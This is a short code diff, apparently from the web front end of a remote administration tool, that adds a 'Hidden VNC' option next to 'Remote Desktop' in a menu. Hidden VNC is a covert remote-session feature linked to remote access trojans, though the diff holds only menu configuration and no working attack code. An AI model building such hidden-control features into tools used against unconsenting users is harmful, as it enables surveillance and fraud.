@@ -60,6 +60,12 @@ const menuOptions = [
     icon: <IconSettings2 size={24} />,
     options: [
       {
+        label: "Hidden VNC",
+        type: "hvnc",
+        icon: <IconDeviceDesktopCog size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
         label: "Remote Desktop",
         type: "remote-desktop",
         icon: <IconShareplay size={24} />,
